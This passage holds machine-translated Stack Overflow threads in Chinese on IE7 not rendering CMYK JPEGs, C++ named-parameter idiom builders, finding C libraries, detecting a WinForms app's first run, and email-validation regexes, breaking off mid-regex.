Great thought PConroy. We were trying to debug our Web application and had images not showing up. Indeed, it was the RGB/CMYK issue. IE 7 does not render CMYK format JPG's.

* * *

## 回答 #3

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T03:48:32.403

有两件事*可能会*有所帮助：

1.  用 /> 关闭你的 img 标签

2.  尝试从链接中删除文本

您的链接应该看起来像这样：

```
<a href="files/image.jsp" title="Image">
  <img src="files/images/image.jpg" alt="Image" width="171" height="96" border="0" />
</a> 
```

这可能是由您的 DOCTYPE 引起的。希望有帮助。

* * *

## 回答 #4

> 赞同：1
> 
>             
> 
> 时间：2011-12-05T05:48:01.190

查找图像的色彩空间：

`identify -verbose MattCutts.jpg | grep Colorspace`

色彩空间：CMYK

然后，将图像转换为 RGB 颜色空间（也可以使用 *.jpg 等）

`mogrify -colorspace rgb MattCutts.jpg`

* * *

## 回答 #5

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T02:47:13.993

过去在我的机器上使用 IE7 本地运行页面时，我也遇到过类似的问题。这可能是问题所在。

* * *

## 回答 #6

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T03:16:25.540

是否为图像分配了空间但图像没有显示？

页面上的其他标记是否可能覆盖了图像应该出现的空间？

您熟悉[IE 的 Web 开发人员工具栏](http://www.microsoft.com/downloads/details.aspx?familyid=e59c3964-672d-4511-bb3e-2d5e1db91038&displaylang=en)吗？

我认为可能正在渲染图像并且您看不到它们，因为有其他东西覆盖了它们，或者它们所在的容器的标记导致它不可见。

祝你好运。

# c++ - 使用 C++ 命名参数成语的更好方法？

> ID：210939
> 
>         
> 
> 赞同：9
> 
>         
> 
> 时间：2008-10-17T02:37:15.400
> 
>         
> 
> 标签：c++, named-parameters

我一直在为 Windows 开发一个 GUI 库（作为个人项目，没有实用性的愿望）。对于我的主窗口类，我设置了选项类的层次结构（使用[命名参数惯用语](http://www.parashift.com/c++-faq-lite/named-parameter-idiom.html)），因为一些选项是共享的，而其他选项特定于特定类型的窗口（如对话框）。

Named Parameter Idiom 的工作方式是，参数类的函数必须返回它们被调用的对象。问题在于，在层次结构中，每一个都必须是*不同*的类——`createWindowOpts`标准窗口`createDialogOpts`类、对话框类等等。我已经通过制作所有选项类模板来解决这个问题。这是一个例子：

```
template <class T>
class _sharedWindowOpts: public detail::_baseCreateWindowOpts {
    public: ///////////////////////////////////////////////////////////////
    // No required parameters in this case.
    _sharedWindowOpts() { };

    typedef T optType;

    // Commonly used options
    optType& at(int x, int y) { mX=x; mY=y; return static_cast<optType&>(*this); }; // Where to put the upper-left corner of the window; if not specified, the system sets it to a default position
    optType& at(int x, int y, int width, int height) { mX=x; mY=y; mWidth=width; mHeight=height; return static_cast<optType&>(*this); }; // Sets the position and size of the window in a single call
    optType& background(HBRUSH b) { mBackground=b; return static_cast<optType&>(*this); }; // Sets the default background to this brush
    optType& background(INT_PTR b) { mBackground=HBRUSH(b+1); return static_cast<optType&>(*this); }; // Sets the default background to one of the COLOR_* colors; defaults to COLOR_WINDOW
    optType& cursor(HCURSOR c) { mCursor=c; return static_cast<optType&>(*this); }; // Sets the default mouse cursor for this window; defaults to the standard arrow
    optType& hidden() { mStyle&=~WS_VISIBLE; return static_cast<optType&>(*this); }; // Windows are visible by default
    optType& icon(HICON iconLarge, HICON iconSmall=0) { mIcon=iconLarge; mSmallIcon=iconSmall; return static_cast<optType&>(*this); }; // Specifies the icon, and optionally a small icon
    // ...Many others removed...
};

template <class T>
class _createWindowOpts: public _sharedWindowOpts<T> {
    public: ///////////////////////////////////////////////////////////////
    _createWindowOpts() { };

    // These can't be used with child windows, or aren't needed
    optType& menu(HMENU m) { mMenuOrId=m; return static_cast<optType&>(*this); }; // Gives the window a menu
    optType& owner(HWND hwnd) { mParentOrOwner=hwnd; return static_cast<optType&>(*this); }; // Sets the optional parent/owner
};

class createWindowOpts: public _createWindowOpts<createWindowOpts> {
    public: ///////////////////////////////////////////////////////////////
    createWindowOpts() { };
}; 
```

它可以工作，但正如您所见，它需要大量的额外工作：对每个函数的返回类型进行类型转换、额外的模板类等等。

我的问题是，在这种情况下是否有一种更简单的方法来实现命名参数习语，不需要所有额外的东西？

* * *

## 回答 #1

> 赞同：11
> 
>             
> 
> 时间：2008-10-17T07:24:29.067

也许不是你想听到的，但我认为在库代码中有很多丑陋的类型转换和模板*参数**是*可以的客户端更容易。库代码的美妙之处不在于代码本身，而在于它使客户能够编写的代码。以 STL 为例。

我还开发了一个小型 GUI 库作为个人项目，其愿望与您基本相同，其中一些代码变得非常丑陋，但最终它允许我编写漂亮的客户端代码（至少在我的 (可能是变态的）眼睛），这就是恕我直言。

* * *

## 回答 #2

> 赞同：5
> 
>             
> 
> 时间：2008-10-17T10:08:17.393

怎么样...？

```
template <class T>
class _sharedWindowOpts: public detail::_baseCreateWindowOpts {

protected: // (protected so the inheriting classes may also use it)

    T & me() { return static_cast<T&>(*this); }               // !

public:
    // No required parameters in this case.
    _sharedWindowOpts() { };

    typedef T optType;

    // Commonly used options
    optType& at(int x, int y) { mX=x; mY=y; return me(); };   // !
    // ...
}; 
```

* * *

## 回答 #3

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T03:16:12.233

您可以按相反的继承顺序链接方法调用吗？

所以在你的例子中你会做类似的事情

窗口窗口 = CreateWindow("foo").menu(hmenu).owner(hwnd).at(0,0).background(hbr);

我意识到它不是 100% 透明的，但似乎更容易并且几乎是正确的。

* * *

## 回答 #4

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T04:48:03.390

我不知道我是否爱上了这个答案，但这里有一种使用模板参数推导的可能性。  **注意**我没有我的编译器，我明天会仔细检查它，除非那里的其他人想试一试。

```
class sharedWindowOpts
{
public:

  sharedWindowOpts() {};

  // Commonly used options
  template <class optType>
  static optType& at(int x, int y, optType& opts) { opts.mX=x; opts.mY=y; return opts; };

  template <class optType>
  static optType& background(HBRUSH b, optType& opts) { opts.mBackground=b; return opts; };

  // etc...
}

class createWindowOpts : public sharedWindowOpts
{
public:
  createWindowOpts() : sharedwindowOpts() {};

  // These can't be used with child windows, or aren't needed
  template <class optType>
  static optType& menu(HMENU m, optType& opts) { opts.mMenuOrId=m; return opts; };

  template <class optType>
  static optType& owner(HWND hwnd, optType& opts) { opts.mParentOrOwner=hwnd; return opts; };
 } 
```

然后你会像这样调用 CreateWindow：

```
CreateWindow( createWindowOpts::owner(hwnd,
              createWindowOpts::at(0, 100,     // can use createWindowOpts because it doesn't hide sharedWindowsOpts::at
              createWindowOpts::menu(hmenu, createWindowOpts() ) ) ) ); 
```

当然，令人讨厌的事情是必须使用静态方法调用语法和所有额外的括号。如果将静态成员函数替换为非成员函数，则可以消除这种情况。不过，它确实避免了类型转换和额外的模板类。

**就个人而言，我宁愿像你的方法一样在库中使用奇怪的代码，而不是像我一样在任何地方使用库。**

* * *

## 回答 #5

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T11:17:17.817

模板很热。

但是 POP（Plain old Polymorphism）并没有死。

为什么不返回一个（智能）指向子类的指针？

* * *

## 回答 #6

> 赞同：0
> 
>             
> 
> 时间：2010-05-11T00:52:05.937

我知道我迟到了一年，还差了一美元，但无论如何我都会提出我的解决方案。

```
//////// Base.. 

template<typename DerivedBuilder, typename Options>
class Builder
{
protected:
    Builder() {}
    DerivedBuilder& me() { return *static_cast<DerivedBuilder*>(this); }

    Options options;
};

//////////////////////////       A       //////////////////////////

class Options_A
{
public:
    Options_A() : a(7) {}
    int a;
};

class Builder_A;

class A 
{
public:
    virtual ~A() {}
    virtual void print() { cout << "Class A, a:" << a << endl; }

protected:
    friend class Builder_A;
    A(const Options_A& options) : a(options.a) {}
    int a;
};

template<typename DerivedBuilder, typename Options = Options_A>
class BuilderT_A : public Builder<DerivedBuilder, Options>
{
public:
    using Builder<DerivedBuilder, Options>::options;
    using Builder<DerivedBuilder, Options>::me;
    DerivedBuilder& a(int p) { options.a = p; return me(); }
};

class Builder_A : public BuilderT_A<Builder_A>
{
public:
    shared_ptr<A> create()
    {
        shared_ptr<A> obj(new A(options));
        return obj;
    }
};

//////////////////////////      B       //////////////////////////

class Options_B : public Options_A
{
public:
    Options_B() : b(8) {}
    int b;
};

class Builder_B;

class B : public A 
{
public:
    virtual ~B() {}
    virtual void print() { cout << "Class B, a:" << a << ", b:" << b << endl; }

protected:
    friend class Builder_B;
    B(const Options_B& options) : A(options), b(options.b) {}
    int b;
};

template<typename DerivedBuilder, typename Options = Options_B>
class BuilderT_B : public BuilderT_A<DerivedBuilder, Options>
{
public:
    using Builder<DerivedBuilder, Options>::options;
    using Builder<DerivedBuilder, Options>::me;
    DerivedBuilder& b(int p) { options.b = p; return me(); }
};

class Builder_B : public BuilderT_B<Builder_B>
{
public:
    shared_ptr<B> create()
    {
        shared_ptr<B> obj(new B(options));
        return obj;
    }
};

//////////////////////////       C       //////////////////////////

class Options_C : public Options_B
{
public:
    Options_C() : c(9) {}
    int c;
};

class Builder_C;

class C : public B 
{
public:
    virtual ~C() {}
    virtual void print() { cout << "Class C, a:" << a << ", b:" << b << ", c:" << c << endl; }

protected:
    friend class Builder_C;
    C(const Options_C& options) : B(options), c(options.c) {}
    int c;
};

template<typename DerivedBuilder, typename Options = Options_C>
class BuilderT_C : public BuilderT_B<DerivedBuilder, Options_C>
{
public:
    using Builder<DerivedBuilder, Options>::options;
    using Builder<DerivedBuilder, Options>::me;
    DerivedBuilder& c(int p) { options.c = p; return *static_cast<DerivedBuilder*>(this); }
};

class Builder_C : public BuilderT_C<Builder_C>
{
public:
    shared_ptr<C> create()
    {
        shared_ptr<C> obj(new C(options));
        return obj;
    }
};

///////////////////////////////////////////////////////////////////////////

int main()
{
    shared_ptr<A> a = Builder_A().a(55).a(1).create();
    a->print();

    shared_ptr<B> b = Builder_B().b(99).b(2).a(88).b(4).a(2).b(3).create();
    b->print();

    shared_ptr<C> c = Builder_C().a(99).b(98).c(97).a(96).c(6).b(5).a(4).create();
    c->print();

    return 0;
}

/* Output:

Class A, a:1
Class B, a:2, b:3
Class C, a:4, b:5, c:6

*/ 
```

C 派生自 B，B 派生自 A。我重复了参数以表明它们可以按所需的任何顺序排列。

# c - C 非标准库

> ID：210943
> 
>         
> 
> 赞同：6
> 
>         
> 
> 时间：2008-10-17T02:38:51.483
> 
>         
> 
> 标签：c

我对编程很陌生，我想知道是否有良好编程的非标准 C 代码和库的良好来源。

我用谷歌搜索并没有找到任何东西。我对此感到有些惊讶，尤其是因为我曾经搜索过许多 Python 示例和库，并且从来没有遇到过任何问题。

我已经使用了标准库，例如 stdio.c、stdlib.c 和 math.c，但我想使用一些更具体的 C 模块。例如，图形处理库。（我真的不需要这个，只是C的集合，不是C++或C#，资源和例子）

* * *

## 回答 #1

> 赞同：5
> 
>             
> 
> 时间：2008-10-17T02:45:51.733

C 库没有“集中式”源代码……至少没有像 Perl 的 CPAN 或 Python 的 Python 包索引那样。

由于 C 是系统编程的“默认”语言，通常没有说明库是为 C 编写的。您可能想尝试 Freshmeat.net 的[高级搜索](http://freshmeat.net/search/set-advanced/?q=%2Bgraph&section=projects&orderby=)，因为它以 Unix 软件为中心，并且有很多 C 库张贴在那里。例如，这是我搜索“图库”时的结果：http: //freshmeat.net/search/?section=projects&q=%2Bgraph+% [2Blibrary](http://freshmeat.net/search/?section=projects&q=%2Bgraph+%2Blibrary)，您可以按语言、许可证等过滤这些结果。

（而且你的英语很好！我不能说这里所有的海报：-p）

* * *

## 回答 #2

> 赞同：3
> 
>             
> 
> 时间：2008-10-17T02:49:32.770

如果您正在寻找一个好的 C 代码库来检查和学习，那么我推荐[GNU](http://directory.fsf.org/GNU/)的东西。你可以找到任何东西，从像[cat这样的小程序到像](http://directory.fsf.org/project/coreutils/)[Emacs](http://directory.fsf.org/project/emacs/)和[Gnome](http://directory.fsf.org/project/gnome/)这样的超大型项目。所有代码都在 GPL 下发布，并且可以自由地合并到 GPL 的自由软件中。

* * *

## 回答 #3

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T02:46:52.637

我不知道任何 C 特定的模块集合。如果我正在寻找 C 模块，我会检查[sourceforge](http://sourceforge.net/)和[freshmeat](http://freshmeat.net/)。[Glib](http://library.gnome.org/devel/glib/)也是一个很棒的库。

* * *

## 回答 #4

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T02:56:26.690

根据您的算法需求，您还可以考虑《[C++](http://www.nr.com/)中的数值食谱》或较早的 C 中的数值食谱（不过它可能已绝版）。

[EDIT] I didn't originally see this, but I found a link to the older book [here](http://www.nrbook.com/a/bookcpdf.php).

# c# - c# winforms：确定程序的第一次运行

> ID：210944
> 
>         
> 
> 赞同：2
> 
>         
> 
> 时间：2008-10-17T02:38:53.777
> 
>         
> 
> 标签：c#, .net, windows, winforms

我需要展示一次向导，这是我的 Windows 窗体应用程序在安装后第一次运行时。我想我可以使用像 firstrun = false 这样的用户设置。但是我还需要处理程序被卸载然后重新安装的情况。该用户设置将如何重置？它已经存在于该用户的 ...\Users--user--\AppData\Roaming... 的配置文件中。我需要在重新安装后运行向导，因此我需要重置该设置。我是否需要使用自定义安装程序操作来执行此操作？

* * *

## 回答 #1

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T02:45:58.300

Windows 注册表似乎适合这种类型的设置。安装程序步骤可以在用户重新安装时重置密钥，或者如果您不想在安装之间保留任何设置，您可以在卸载时清除注册表项。

* * *

## 回答 #2

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T04:36:45.457

最好让您的安装程序在注册表中创建 FirstRun 键并将其设置为 true（或 1 或其他），并确保您的卸载程序完全删除此键。然后让您的应用程序在启动时读取此密钥，并将其设置为 false（或 0 或其他）。

如果用户卸载然后重新安装您的应用程序，他们将在第一次运行它时再次看到该向导。

* * *

## 回答 #3

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T06:11:37.717

在多个 Windows 用户使用同一个应用程序的情况下，每个用户的 true/false 设置将永远无法正常工作。安装程序仅作为 Windows 用户之一运行一次，并且无法访问该计算机上所有其他用户的每用户设置。

您可以在安装时将每台机器的标志设置为 true。但是，如果管理员用户运行 FRW 并对其进行更改，则其他用户将不会获得 FRW。如果非管理员用户运行 FRW，他们将无法更改它，并将在下一次应用程序运行时运行 FRW。

您需要的是安装的机器范围时间戳和运行 FRW 时的每个用户时间戳。这是场景：

安装时，在 HKLM 注册表中为您的应用添加时间戳。对于每个用户，当应用程序启动时，请检查您上面提到的每个用户设置文件中的首次运行向导 (FRW) 的时间戳。如果每用户时间戳早于 HKLM 安装时间戳，请为该用户运行 FRW 并更新每用户设置文件。

如果应用程序被卸载然后再次安装，安装程序将更新 HKLM 时间戳，从而导致再次为所有用户运行 FRW。

* * *

## 回答 #4

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T02:45:21.330

在设置文件或 resx 文件中使用名称-值对，例如 FirstRun=true。启动时读取此文件，如果为真，则显示向导并设置为假。

每次安装时，文件的副本都应该被覆盖，因此您将获得 FirstRun=true。该向导将在每次（重新）安装后运行

* * *

## 回答 #5

> 赞同：1
> 
>             
> 
> 时间：2010-07-23T00:40:31.280

可以存储已运行配置向导的用户列表。

该列表可以存储在机器级配置文件或应用程序目录中。重新安装应用程序时，此列表可能会被清除。

无需查看 FirstRun，您只需使用列表检查当前用户。如果用户在列表中，请跳过配置向导。如果用户不在列表中，则显示配置向导。  

* * *

## 回答 #6

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T02:44:30.550

您可以在程序目录中创建一个文件。卸载程序不会删除它，因为它不是由安装程序添加的。

* * *

## 回答 #7

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T07:31:25.993

我建议更改程序的行为，并且在重新安装后不要重置配置设置。毕竟，用户已经做出了自己的选择，为什么还要问同样的问题呢？

* * *

## 回答 #8

> 赞同：0
> 
>             
> 
> 时间：2010-10-25T23:11:09.810

类似于@Franci Penov 的建议，我会这样做：

*   安装时，使用新生成的 GUID 创建注册表值 HKLM\Software\YourCompany\YourApp\InstallId。

*   在用户首次运行时，将该值与 HKCU\Software\YourCompany\YourApp\InstallId 进行比较。

*   如果 HKCU 值不存在或它们不同，请运行您的首次运行逻辑，然后将 HKLM\Software\YourCompany\YourApp\InstallId 复制到 HKCU\Software\YourCompany\YourApp\InstallId。

这具有不易受时间变化影响的（微小）优势。

# regex - 什么是全球公认的匹配电子邮件地址的正则表达式

> ID：210945
> 
>         
> 
> 赞同：10
> 
>         
> 
> 时间：2008-10-17T02:39:10.420
> 
>         
> 
> 标签：regex, language-agnostic, email-validation

我见过很多例子，有很多“不，你错过了一些东西”的评论。匹配电子邮件地址的正确方法是什么？

为了理智起见，只允许使用完全限定的域名，不允许使用 @localhost。（或者，两种方式）

必须允许子域 (issac@deptartment.company.museum)

* * *

## 回答 #1

> 赞同：18
> 
>             
> 
> 时间：2008-10-17T02:50:28.743

[这个](http://ex-parrot.com/~pdw/Mail-RFC822-Address.html)正则表达式符合[RFC 2822](http://www.faqs.org/rfcs/rfc2822.html)中描述的语法，它很长，但是 RFC 中描述的语法很复杂......

* * *

## 回答 #2

> 赞同：8
> 
>             
> 
> 时间：2009-03-15T11:18:38.797

在纯正则表达式中不可能这样做。Regexen 无法匹配完整的 RFC 规范要求的嵌套括号。（关于这件事的最新 RFC 是 RFC5322，几个月前才发布。）

电子邮件地址的完全验证需要类似于 CFG 的东西，还有一些需要注意的事情；例如，电子邮件地址可以包含`'\0'`空字符...，因此您不能对它们使用任何 C 的普通字符串函数。

实际上，我用我写的东西的链接回答问题有点奇怪，但碰巧的是，我有一个我之前准备好的：一个简短且（据我所知）完全兼容的验证器，在 Haskell ; 你可以[在这里看到源代码](http://hackage.haskell.org/packages/archive/email-validate/0.2/doc/html/src/Text-Email-Validate.html)。我想代码可以很容易地移植到任何类似的解析库（可能是 C++ 的 Boost.Spirit），或者同样容易地从另一种语言中连接（Haskell 有[一种非常简单的 C 使用 Haskell 代码的方法](http://www.haskell.org/haskellwiki/Calling_Haskell_from_C)，并且*一切都*可以使用 C 绑定...)

源代码中还有大量的测试用例（我没有从模块中导出它们），这要归功于[Dominic Sayers](http://www.dominicsayers.com/isemail/)，他在 PHP 中拥有自己的符合 RFC 的解析器版本。（有几个测试失败了，但它们比 RFC5322 指定的更严格，所以我现在很好。）

* * *

## 回答 #3

> 赞同：7
> 
>             
> 
> 时间：2008-10-17T02:48:13.303

这是几周前[在这里问的。](https://stackoverflow.com/questions/156430/regexp-recognition-of-email-address-hard)归根结底，有许多合法地址是简单的正则表达式无法匹配的。匹配大多数合法地址需要一个真正疯狂的正则表达式。即便如此，一个语法上合法的地址也不能保证其背后存在一个帐户——例如 foo@example.invalid。

* * *

## 回答 #4

> 赞同：4
> 
>             
> 
> 时间：2009-11-05T18:38:45.540

更不用说在不久的将来允许使用中文/阿拉伯域名。每个人都必须更改使用的电子邮件正则表达式，因为这些字符肯定不会被`[a-z]/i`nor覆盖`\w`。他们都会失败。

毕竟，验证电子邮件地址的最佳方法仍然是实际向相关地址发送电子邮件以验证地址。如果电子邮件地址是用户身份验证（注册/登录/等）的一部分，那么您可以将其与用户激活系统完美结合。即向指定的电子邮件地址发送带有唯一激活密钥链接的电子邮件，并且仅当用户使用电子邮件中的链接激活新创建的帐户时才允许登录。

如果正则表达式的目的只是为了在 UI 中快速通知用户指定的电子邮件地址格式不正确，最好还是检查它是否与以下正则表达式基本匹配：

```
([^.@]+)(\\.[^.@]+)*@([^.@]+\\.)+([^.@]+) 
```

就那么简单。为什么你会关心名称和域中使用的字符？

* * *

## 回答 #5

> 赞同：3
> 
>             
> 
> 时间：2008-10-17T11:31:28.770

不幸的是，它不是正则表达式，但是... 验证电子邮件地址的正确方法是向其发送消息并查看用户是否回复。

如果您真的非常想验证地址在语法上是否有效/符合 RFC，那么正则表达式仍然不太可能成为该工作的正确工具。您很可能创建一个比具有类似 RFC 合规级别的正则表达式长度更少的字符的解析器，并且解析器可能会更快地启动。

即使对 RFC 合规性进行了完美测试，anon@ymo.us 的格式也很完美，并且引用了现有域，因此除非您发送地址，否则您不会知道所提供的地址是否实际有效信息。

* * *

## 回答 #6

> 赞同：2
> 
>             
> 
> 时间：2009-11-05T18:33:58.990

一般建议是不要

可能值得简单检查一下他们是否输入了“something@somethign.something”，只是为了检查他们是否将电子邮件放入了正确的框中。

除此之外，大多数官方正则表达式允许如此多的模糊案例，以至于它们具有巨大的误报率（它们将允许技术上合法但极不可能的条目）

* * *

## 回答 #7

> 赞同：2
> 
>             
> 
> 时间：2009-11-26T14:48:29.097

来自[http://www.ex-parrot.com/~pdw/Mail-RFC822-Address.html](http://www.ex-parrot.com/~pdw/Mail-RFC822-Address.html)：

RFC 822 中描述的语法非常复杂。使用正则表达式实现验证在某种程度上推动了使用正则表达式的合理范围，尽管 Perl 可以很好地应对：

```
(?:(?:\r\n)?[ \t])*(?:(?:(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t]
)+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:
\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(
?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ 
\t]))*"(?:(?:\r\n)?[ \t])*))*@(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\0
31]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\
](?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+
(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:
(?:\r\n)?[ \t])*))*|(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z
|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)
?[ \t])*)*\<(?:(?:\r\n)?[ \t])*(?:@(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\
r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[
 \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)
?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t]
)*))*(?:,@(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[
 \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*
)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t]
)+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*)
*:(?:(?:\r\n)?[ \t])*)?(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+
|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r
\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:
\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t
]))*"(?:(?:\r\n)?[ \t])*))*@(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031
]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](
?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?
:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?
:\r\n)?[ \t])*))*\>(?:(?:\r\n)?[ \t])*)|(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?
:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?
[ \t]))*"(?:(?:\r\n)?[ \t])*)*:(?:(?:\r\n)?[ \t])*(?:(?:(?:[^()<>@,;:\\".\[\] 
\000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|
\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>
@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"
(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*))*@(?:(?:\r\n)?[ \t]
)*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\
".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?
:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[
\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*|(?:[^()<>@,;:\\".\[\] \000-
\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(
?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*)*\<(?:(?:\r\n)?[ \t])*(?:@(?:[^()<>@,;
:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([
^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\"
.\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\
]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*(?:,@(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\
[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\
r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] 
\000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]
|\\.)*\](?:(?:\r\n)?[ \t])*))*)*:(?:(?:\r\n)?[ \t])*)?(?:[^()<>@,;:\\".\[\] \0
00-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\
.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,
;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|"(?
:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*))*@(?:(?:\r\n)?[ \t])*
(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".
\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?:\.(?:(?:\r\n)?[ \t])*(?:[
^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\".\[\]
]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*\>(?:(?:\r\n)?[ \t])*)(?:,\s*(
?:(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[\["()<>@,;:\\
".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t])*)(?:\.(?:(
?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|\Z|(?=[
\["()<>@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[ \t]))*"(?:(?:\r\n)?[ \t
])*))*@(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t
])+|\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*)(?
:\.(?:(?:\r\n)?[ \t])*(?:[^()<>@,;:\\".\[\] \000-\031]+(?:(?:(?:\r\n)?[ \t])+|
\Z|(?=[\["()<>@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[ \t])*))*|(?:
